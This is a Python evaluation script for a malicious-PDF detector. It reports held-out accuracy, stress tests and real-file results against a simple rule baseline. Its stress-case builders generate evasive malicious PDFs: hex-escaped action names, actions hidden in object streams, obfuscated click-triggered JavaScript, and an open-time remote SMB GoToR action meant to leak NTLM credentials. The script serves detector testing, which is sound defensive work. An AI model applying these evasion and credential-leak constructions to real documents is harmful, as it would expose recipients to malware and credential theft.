"""Evaluate a trained model beyond the training split.

Three kinds of evidence, reported separately so a good number in one cannot
hide a bad number in another:

1. **Held-out set** - freshly generated with a different seed than training.
2. **Stress tests** - cases deliberately outside the training distribution:
   evasion tricks, malformed files, legitimate JavaScript, very large files.
3. **Real-world files** - any PDFs you point it at (label them benign/malicious
   by folder name).

Every result is compared with a one-line rule baseline ("has JavaScript or an
automatic trigger or a launch action") so it is clear what the model adds.
"""

from __future__ import annotations

import io
import json
import random
import tempfile
from dataclasses import dataclass
from pathlib import Path

import numpy as np
import pikepdf
from sklearn.metrics import confusion_matrix, roc_auc_score

from .features import FEATURE_NAMES, extract_features
from .model import DEFAULT_MODEL_PATH, SUSPICIOUS_AT, load_model, score_features
from .jsgen import malicious_script
from .samples import _save, build_benign, build_calculating_form, build_document, build_malicious

HELD_OUT_SEED = 20260926  # training uses 42; tests use 1234


def rule_baseline(vec: list[float]) -> int:
    f = dict(zip(FEATURE_NAMES, vec))
    return int(bool(f["open_action"] or f["additional_actions"] or f["javascript_count"] or f["launch_action"]))


# --- stress-case builders ---------------------------------------------------

def _obfuscated(rng: random.Random) -> bytes:
    """Malicious sample with every sensitive name hex-escaped (/J#61vaScript)."""
    data = build_malicious(rng)
    with pikepdf.open(io.BytesIO(data)) as pdf:
        buf = io.BytesIO()
        pdf.save(buf, compress_streams=False, object_stream_mode=pikepdf.ObjectStreamMode.disable)
    data = buf.getvalue()
    for name in (b"/JavaScript", b"/OpenAction", b"/Launch", b"/EmbeddedFile"):
        data = data.replace(name, name[:2] + b"#%02x" % name[2] + name[3:])
    return data


def _truncated(rng: random.Random) -> bytes:
    """Malicious sample cut off mid-file (broken xref table)."""
    data = build_malicious(rng)
    return data[: int(len(data) * rng.uniform(0.6, 0.9))]


def _truncated_benign(rng: random.Random) -> bytes:
    data = build_benign(rng)
    return data[: int(len(data) * rng.uniform(0.6, 0.9))]


def _object_streams(rng: random.Random) -> bytes:
    """Malicious sample with actions hidden inside compressed object streams."""
    with pikepdf.open(io.BytesIO(build_malicious(rng))) as pdf:
        buf = io.BytesIO()
        pdf.save(buf, object_stream_mode=pikepdf.ObjectStreamMode.generate)
    return buf.getvalue()


def _click_triggered_js(rng: random.Random) -> bytes:
    """Obfuscated JavaScript that runs when the reader clicks a link.

    Training malware always has an automatic trigger, so this measures
    whether the model generalises from the script content alone.
    """
    with pikepdf.open(io.BytesIO(build_document(rng, encrypt=False))) as pdf:
        action = pdf.make_indirect(pikepdf.Dictionary(
            S=pikepdf.Name.JavaScript, JS=pikepdf.String(malicious_script(rng))))
        annot = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name.Annot, Subtype=pikepdf.Name.Link,
            Rect=[72, 700, 300, 720], Border=[0, 0, 0], A=action))
        page = pdf.pages[0].obj
        page.Annots = page.get("/Annots", pikepdf.Array())
        page.Annots.append(annot)
        return _save(pdf)


def _password_protected(rng: random.Random, malicious: bool) -> bytes:
    data = build_malicious(rng) if malicious else build_benign(rng)
    with pikepdf.open(io.BytesIO(data)) as pdf:
        buf = io.BytesIO()
        pdf.save(buf, encryption=pikepdf.Encryption(owner="owner", user="invoice2026"))
    return buf.getvalue()


def _remote_gotor(rng: random.Random) -> bytes:
    """Opens a file on a remote SMB share at open time (NTLM credential leak)."""
    with pikepdf.open(io.BytesIO(build_document(rng, encrypt=False))) as pdf:
        host = "".join(rng.choices("abcdefghij", k=6))
        pdf.Root.OpenAction = pikepdf.Dictionary(
            S=pikepdf.Name.GoToR, F=pikepdf.String(f"\\\\{host}.invalid\\share\\doc.pdf"),
            D=pikepdf.Array([0, pikepdf.Name.Fit]))
        return _save(pdf)


def _calculating_form(rng: random.Random) -> bytes:
    return build_calculating_form()


def _large_benign(rng: random.Random) -> bytes:
    """Much longer than anything in training (40-80 pages)."""
    return build_document(rng, pages=rng.randint(40, 80))


def _large_malicious(rng: random.Random) -> bytes:
    from .samples import inject_markers
    return inject_markers(build_document(rng, pages=rng.randint(40, 80)), rng)


STRESS_CASES = {
    # name: (builder, true label, what it tests)
    "obfuscated names": (_obfuscated, 1, "hex-escaped /J#61vaScript etc."),
    "truncated file": (_truncated, 1, "broken xref, parser recovery / fallback"),
    "object streams": (_object_streams, 1, "actions inside compressed object streams"),
    "large malicious": (_large_malicious, 1, "40-80 pages, outside training size range"),
    "click-triggered JS": (_click_triggered_js, 1, "obfuscated JS on a link click, no auto-trigger"),
    "remote GoToR": (_remote_gotor, 1, "opens \\\\host\\share on open: NTLM leak, never seen in training"),
    "password malicious": (lambda r: _password_protected(r, True), 1, "user password: contents unreadable"),
    "password benign": (lambda r: _password_protected(r, False), 0, "user password: contents unreadable"),
    "truncated benign": (_truncated_benign, 0, "broken benign files must not look malicious"),
    "large benign": (_large_benign, 0, "40-80 pages, outside training size range"),
    "calculating form": (_calculating_form, 0, "legitimate field-level JavaScript (was a false positive)"),
}


# --- evaluation ---------------------------------------------------------------

@dataclass
class Result:
    name: str
    label: int
    n: int
    model_correct: int
    rule_correct: int
    note: str = ""

    @property
    def model_acc(self) -> float:
        return self.model_correct / self.n if self.n else 0.0

    @property
    def rule_acc(self) -> float:
        return self.rule_correct / self.n if self.n else 0.0


def _score_files(model, paths: list[Path]) -> tuple[np.ndarray, np.ndarray]:
    """Scores exactly as `pdfshield scan` computes them (model + policy)."""
    feats = [extract_features(p) for p in paths]
    scores = np.array([score_features(f, model)[0] for f in feats])
    return scores, np.array([rule_baseline(f.to_vector()) for f in feats])


def _write(tmp: Path, name: str, data: bytes) -> Path:
    path = tmp / name
    path.write_bytes(data)
    return path


def evaluate(model_path: Path = DEFAULT_MODEL_PATH, n_held_out: int = 500, n_stress: int = 50,
             real_dirs: list[Path] | None = None, seed: int = HELD_OUT_SEED) -> dict:
    model = load_model(str(model_path))
    rng = random.Random(seed)
    report: dict = {"seed": seed, "threshold": SUSPICIOUS_AT}

    with tempfile.TemporaryDirectory() as tmpdir:
        tmp = Path(tmpdir)

        # 1. held-out set
        paths, labels = [], []
        for i in range(n_held_out):
            paths.append(_write(tmp, f"hb{i}.pdf", build_benign(rng))); labels.append(0)
            paths.append(_write(tmp, f"hm{i}.pdf", build_malicious(rng))); labels.append(1)
        y = np.array(labels)
        proba, rule = _score_files(model, paths)
        pred = (proba >= SUSPICIOUS_AT).astype(int)
        tn, fp, fn, tp = confusion_matrix(y, pred, labels=[0, 1]).ravel()
        rtn, rfp, rfn, rtp = confusion_matrix(y, rule, labels=[0, 1]).ravel()
        report["held_out"] = {
            "n": int(len(y)),
            "model": {"accuracy": float((pred == y).mean()), "precision": float(tp / max(tp + fp, 1)),
                      "recall": float(tp / max(tp + fn, 1)), "roc_auc": float(roc_auc_score(y, proba)),
                      "confusion": {"tn": int(tn), "fp": int(fp), "fn": int(fn), "tp": int(tp)}},
            "rule_baseline": {"accuracy": float((rule == y).mean()),
                              "confusion": {"tn": int(rtn), "fp": int(rfp), "fn": int(rfn), "tp": int(rtp)}},
        }

        # 2. stress tests
        stress = []
        for name, (builder, label, note) in STRESS_CASES.items():
            n = 1 if name == "calculating form" else n_stress  # deterministic builder
            ps = [_write(tmp, f"s_{name.replace(' ', '_')}_{i}.pdf", builder(rng)) for i in range(n)]
            proba, rule = _score_files(model, ps)
            pred = (proba >= SUSPICIOUS_AT).astype(int)
            stress.append(Result(name, label, n, int((pred == label).sum()), int((rule == label).sum()), note))
        report["stress"] = [
            {"case": r.name, "true_label": "malicious" if r.label else "benign", "n": r.n,
             "model_accuracy": round(r.model_acc, 4), "rule_accuracy": round(r.rule_acc, 4), "tests": r.note}
            for r in stress
        ]

    # 3. real-world files
    real = []
    for d in real_dirs or []:
        paths = sorted(p for p in Path(d).rglob("*") if p.is_file() and p.suffix.lower() == ".pdf")
        for path in paths:
            label = 1 if "malicious" in path.parts else 0
            feats = extract_features(path)
            vec = feats.to_vector()
            score = score_features(feats, model)[0]
            real.append({"file": str(path), "true_label": "malicious" if label else "benign",
                         "risk_score": round(score, 4), "correct": int(score >= SUSPICIOUS_AT) == label,
                         "rule_correct": rule_baseline(vec) == label, "parse_error": feats.parse_error})
    report["real_world"] = real
    return report


def format_report(report: dict) -> str:
    h = report["held_out"]
    m, r = h["model"], h["rule_baseline"]
    lines = [
        f"Held-out set ({h['n']} unseen files, seed {report['seed']})",
        f"  model:          accuracy {m['accuracy']:.3f}  precision {m['precision']:.3f}  "
        f"recall {m['recall']:.3f}  ROC-AUC {m['roc_auc']:.3f}",
        f"                  TN {m['confusion']['tn']}  FP {m['confusion']['fp']}  "
        f"FN {m['confusion']['fn']}  TP {m['confusion']['tp']}",
        f"  rule baseline:  accuracy {r['accuracy']:.3f}",
        "",
        "Stress tests (outside the training distribution)",
        f"  {'case':<22}{'label':<11}{'n':>4}  {'model':>7}  {'rule':>7}",
    ]
    for s in report["stress"]:
        lines.append(f"  {s['case']:<22}{s['true_label']:<11}{s['n']:>4}  "
                     f"{s['model_accuracy']:>7.0%}  {s['rule_accuracy']:>7.0%}")
    real = report["real_world"]
    if real:
        lines += ["", f"Real-world files ({len(real)})"]
        for label in ("benign", "malicious"):
            group = [f for f in real if f["true_label"] == label]
            if not group:
                continue
            ok, rule_ok = sum(f["correct"] for f in group), sum(f["rule_correct"] for f in group)
            lines.append(f"  {label:<10} model {ok}/{len(group)} ({ok / len(group):.1%})   "
                         f"rule {rule_ok}/{len(group)} ({rule_ok / len(group):.1%})")
        misses = [f for f in real if not f["correct"]]
        for f in misses[:25]:
            lines.append(f"  MISS  {f['true_label']:<9} risk {f['risk_score']:.0%}  {f['file']}")
        if len(misses) > 25:
            lines.append(f"  ... and {len(misses) - 25} more (see --output)")
    return "\n".join(lines)


def main(args) -> int:
    report = evaluate(Path(args.model), args.n, args.stress_n, [Path(d) for d in args.real or []])
    print(format_report(report))
    if args.output:
        Path(args.output).write_text(json.dumps(report, indent=2) + "\n")
        print(f"\nFull report written to {args.output}")
    return 0
